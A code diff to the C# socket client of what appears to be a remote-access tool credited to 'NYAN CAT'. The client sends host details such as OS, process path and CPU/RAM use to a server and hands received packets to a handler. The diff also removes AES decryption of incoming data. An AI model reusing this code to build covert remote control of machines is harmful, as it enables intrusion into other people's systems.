@@ -7,6 +7,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Threading;
+using System.Text;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Nyan Socket v0.1
@@ -30,7 +31,7 @@ namespace Client.Sockets
         private static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
         private static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
 
-    public static void InitializeClient()
+        public static void InitializeClient()
         {
             try
             {
@@ -48,7 +49,6 @@ namespace Client.Sockets
                 Buffer = new byte[4];
                 BufferRecevied = false;
                 MS = new MemoryStream();
-                TheCPUCounter.NextValue();
                 BeginSend(SendInfo());
                 Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                 Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
@@ -65,6 +65,7 @@ namespace Client.Sockets
 
             try
             {
+                Packet.KeyRecevied = false;
                 Tick?.Dispose();
                 Client?.Dispose();
                 MS?.Dispose();
@@ -75,7 +76,7 @@ namespace Client.Sockets
             }
         }
 
-        private static byte[] SendInfo()
+        public static byte[] SendInfo()
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
@@ -85,6 +86,7 @@ namespace Client.Sockets
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
+            TheCPUCounter.NextValue();
             msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             return msgpack.Encode2Bytes();
         }
@@ -120,7 +122,7 @@ namespace Client.Sockets
                         MS.Write(Buffer, 0, recevied);
                         if (MS.Length == Buffersize)
                         {
-                            ThreadPool.QueueUserWorkItem(Packet.Read, Settings.aes256.Decrypt(MS.ToArray()));
+                            ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                             Buffer = new byte[4];
                             MS.Dispose();
                             MS = new MemoryStream();
